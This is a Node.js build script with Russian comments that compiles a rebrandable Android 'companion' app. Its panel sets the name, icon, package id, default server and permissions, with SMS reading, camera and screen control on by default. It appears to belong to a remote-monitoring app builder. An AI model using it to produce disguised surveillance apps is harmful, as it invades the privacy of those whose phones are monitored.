// Сборка APK телефонного приложения-компаньона с параметрами из панели
// (имя, package, иконка, разрешения). Реальная компиляция требует Android SDK
// (ANDROID_HOME/ANDROID_SDK_ROOT) и JDK. Если их нет — вернём понятную ошибку
// с подсказкой собрать через GitHub Actions (там SDK есть).

import { spawn } from 'node:child_process';
import path from 'node:path';
import os from 'node:os';
import fs from 'node:fs';
import fsp from 'node:fs/promises';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
export const PROJECT_DIR = path.join(__dirname, 'android-companion');

// INTERNET нужен для трансляции — install-time разрешение, пользователю не показываем.
export const AVAILABLE_PERMISSIONS = [
  { id: 'CAMERA', manifest: 'android.permission.CAMERA', label: 'Камера', runtime: true, default: true },
  { id: 'RECORD_AUDIO', manifest: 'android.permission.RECORD_AUDIO', label: 'Микрофон', runtime: true, default: false },
  { id: 'SCREEN', manifest: 'android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION', label: 'Экран и управление', runtime: false, default: true },
  { id: 'NOTIFICATIONS', manifest: 'android.permission.POST_NOTIFICATIONS', label: 'Уведомления', runtime: true, default: true },
  { id: 'PHONE', manifest: 'android.permission.READ_PHONE_STATE', label: 'Звонки и телефон', runtime: true, default: false },
  { id: 'SMS',       manifest: 'android.permission.READ_SMS',        label: 'СМС',               runtime: true, default: true  },
  { id: 'BLUETOOTH', manifest: 'android.permission.BLUETOOTH_CONNECT', label: 'Bluetooth',         runtime: true, default: true  },
];

export function hasAndroidSdk() {
  const home = process.env.ANDROID_HOME || process.env.ANDROID_SDK_ROOT;
  return Boolean(home && fs.existsSync(home));
}

// Пишем параметры сборки в gradle.properties проекта.
async function writeBuildConfig(cfg) {
  const appName = (cfg.appName || 'Camera Companion').replace(/[\r\n]/g, ' ');
  const appId = (cfg.applicationId || 'com.artem.cameracompanion')
    .replace(/[^a-zA-Z0-9_.]/g, '')
    .replace(/^\.+|\.+$/g, '') || 'com.artem.cameracompanion';
  const perms = (cfg.permissions && cfg.permissions.length ? cfg.permissions : ['CAMERA'])
    .filter((p) => AVAILABLE_PERMISSIONS.some((a) => a.id === p));

  const props = [
    `ARP_APP_NAME=${appName}`,
    `ARP_APPLICATION_ID=${appId}`,
    `ARP_DEFAULT_SERVER=${cfg.defaultServer || ''}`,
    'org.gradle.jvmargs=-Xmx2048m',
    'android.useAndroidX=true',
  ].join('\n') + '\n';

  await fsp.writeFile(path.join(PROJECT_DIR, 'build.properties.generated'), props);
  return { appName, appId, perms };
}

// Патчим AndroidManifest.xml — удаляем разрешения, которые не выбраны,
// и синхронизируем foregroundServiceType. Возвращает restore-функцию.
async function patchManifest(perms) {
  const manifestPath = path.join(PROJECT_DIR, 'app', 'src', 'main', 'AndroidManifest.xml');
  const original = await fsp.readFile(manifestPath, 'utf8');
  let patched = original;
  if (!perms.includes('CAMERA')) {
    patched = patched.replace(/[ \t]*<uses-permission[^>]*android\.permission\.CAMERA[^>]*\/>\n?/g, '');
    patched = patched.replace(/[ \t]*<uses-permission[^>]*FOREGROUND_SERVICE_CAMERA[^>]*\/>\n?/g, '');
  }
  if (!perms.includes('RECORD_AUDIO')) {
    patched = patched.replace(/[ \t]*<uses-permission[^>]*android\.permission\.RECORD_AUDIO[^>]*\/>\n?/g, '');
    patched = patched.replace(/[ \t]*<uses-permission[^>]*FOREGROUND_SERVICE_MICROPHONE[^>]*\/>\n?/g, '');
  }
  if (!perms.includes('SCREEN')) {
    patched = patched.replace(/[ \t]*<uses-permission[^>]*FOREGROUND_SERVICE_MEDIA_PROJECTION[^>]*\/>\n?/g, '');
    patched = patched.replace(/[ \t]*<!--CONTROL_SERVICE_START-->[\s\S]*?<!--CONTROL_SERVICE_END-->\n?/g, '');
  }
  if (!perms.includes('PHONE')) {
    patched = patched.replace(/[ \t]*<!--PHONE_PERM_START-->[\s\S]*?<!--PHONE_PERM_END-->\n?/g, '');
  }
  if (!perms.includes('SMS')) {
    patched = patched.replace(/[ \t]*<!--SMS_PERM_START-->[\s\S]*?<!--SMS_PERM_END-->\n?/g, '');
  }
  if (!perms.includes('BLUETOOTH')) {
    patched = patched.replace(/[ \t]*<!--BT_PERM_START-->[\s\S]*?<!--BT_PERM_END-->\n?/g, '');
  }
  const fstParts = [];
  if (perms.includes('SCREEN')) fstParts.push('mediaProjection');
  if (perms.includes('CAMERA')) fstParts.push('camera');
  if (perms.includes('RECORD_AUDIO')) fstParts.push('microphone');
  if (fstParts.length > 0) {
    patched = patched.replace(/android:foregroundServiceType="[^"]*"/, `android:foregroundServiceType="${fstParts.join('|')}"`);
  } else {
    patched = patched.replace(/\s*android:foregroundServiceType="[^"]*"/, '');
  }
  await fsp.writeFile(manifestPath, patched);
  return () => fsp.writeFile(manifestPath, original);
}

// Заменяем launcher-иконку во всех плотностях, если пользователь загрузил свою
// (ожидается PNG). Android сам масштабирует под нужный размер.
const MIPMAP_DIRS = ['mipmap-mdpi', 'mipmap-hdpi', 'mipmap-xhdpi', 'mipmap-xxhdpi', 'mipmap-xxxhdpi'];
async function applyIcon(iconPath) {
  if (!iconPath) return;
  const resDir = path.join(PROJECT_DIR, 'app', 'src', 'main', 'res');
  for (const d of MIPMAP_DIRS) {
    const dir = path.join(resDir, d);
    await fsp.mkdir(dir, { recursive: true });
    await fsp.copyFile(iconPath, path.join(dir, 'ic_launcher.png'));
  }
}

// Основная функция сборки.
export async function buildApk(cfg, iconPath, onLog = () => {}) {
  const meta = await writeBuildConfig(cfg);
  await applyIcon(iconPath);
  const restoreManifest = await patchManifest(meta.perms);

  if (!hasAndroidSdk()) {
    await restoreManifest();
    const err = new Error(
      'Android SDK не найден на этом ПК. Собрать APK можно двумя способами:\n' +
      '  1) Через GitHub Actions — запусти workflow "Build companion APK" ' +
      '(вкладка Actions в репозитории), он соберёт APK и приложит файл к запуску.\n' +
      '  2) Локально — установи Android Studio / cmdline-tools, задай ANDROID_HOME и повтори.'
    );
    err.code = 'NO_SDK';
    err.meta = meta;
    throw err;
  }

  const gradlew = path.join(PROJECT_DIR, process.platform === 'win32' ? 'gradlew.bat' : 'gradlew');
  const useWrapper = fs.existsSync(gradlew);
  const cmd = useWrapper ? gradlew : 'gradle';
  const args = ['assembleDebug', '--no-daemon'];

  try {
    await new Promise((resolve, reject) => {
      const child = spawn(cmd, args, { cwd: PROJECT_DIR, shell: process.platform === 'win32' });
      child.stdout.on('data', (d) => onLog(d.toString()));
      child.stderr.on('data', (d) => onLog(d.toString()));
      child.on('error', reject);
      child.on('close', (code) => code === 0 ? resolve() : reject(new Error('gradle exited ' + code)));
    });
  } finally {
    await restoreManifest();
  }

  const apk = path.join(PROJECT_DIR, 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');
  if (!fs.existsSync(apk)) throw new Error('Сборка прошла, но APK не найден: ' + apk);

  const outName = `${meta.appName.replace(/[^\w.-]+/g, '_')}.apk`;
  const outPath = path.join(os.tmpdir(), outName);
  await fsp.copyFile(apk, outPath);
  return { apkPath: outPath, fileName: outName, meta };
}
